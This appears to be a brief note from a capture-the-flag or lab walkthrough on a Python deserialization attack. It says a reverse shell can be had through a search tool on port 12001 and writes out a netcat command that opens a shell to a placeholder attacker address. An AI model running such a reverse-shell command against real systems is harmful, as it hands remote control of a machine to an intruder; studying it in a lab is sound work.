# python string attack

hint: deserialization

- it turns out that we can reverse shell in 12001(bocchi search tool)
```ps
nc  <attacker ip addr> <port> -e /bin/sh
```